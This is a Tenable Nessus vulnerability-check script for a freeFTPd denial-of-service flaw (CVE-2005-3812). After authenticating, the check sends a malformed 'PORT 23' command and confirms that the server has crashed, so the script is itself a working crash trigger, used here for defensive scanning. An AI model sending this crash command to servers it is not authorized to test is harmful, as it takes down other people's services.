#
# (C) Tenable Network Security
#


if (description) {
  script_id(20247);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-3812");
  script_bugtraq_id(15557);
 
  script_name(english:"freeFTPd Port Command Denial of Service Vulnerability");
  script_summary(english:"Checks for port command denial of service vulnerability in freeFTPd");
 
 desc = "
Synopsis :

The remote FTP server is prone by to denial of service attacks. 

Description :

The remote host appears to be using freeFTPd, a free FTP / FTPS / SFTP
server for Windows. 

The version of freeFTPd installed on the remote host crashes if it
receives a PORT command with a port number from an authenticated user. 
In addition, the application reportedly will freeze for a period of
time if it receives a PASV command with user-supplied data. 

See also : 

http://www.securityfocus.com/archive/1/417602/30/0/threaded

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 3
(AV:R/AC:L/Au:R/C:N/I:N/A:C/B:A)";
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Denial of Service");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# If it looks like freeFTPd...
banner = get_ftp_banner(port:port);
if (
  banner && 
  egrep(pattern:"220[ -]Hello, I'm freeFTPd", string:banner)
) {
  soc = open_sock_tcp(port);
  if (soc) {
    user = get_kb_item("ftp/login");
    pass = get_kb_item("ftp/password");
    if (!user || !pass) {
      if (log_verbosity > 1) debug_print("ftp/login and/or ftp/password are empty!", level:0);
      exit(0);
    }

    if (!ftp_authenticate(socket:soc, user:user, pass:pass)) {
      if (log_verbosity > 1) debug_print("can't login with supplied ftp credentials!", level:0);
      close(soc);
      exit(1);
    }

    c = string("PORT 23");
    s = ftp_send_cmd(socket:soc, cmd:c);

    if (!strlen(s)) {
      # Daemon doesn't crash immediately.
      sleep(5);

      # Check whether it's truly down.
      soc2 = open_sock_tcp(port);
      if (soc2) close(soc2);
      else {
        security_note(port);
        exit(0);
      }
    }

    ftp_close(socket:soc);
  }
}
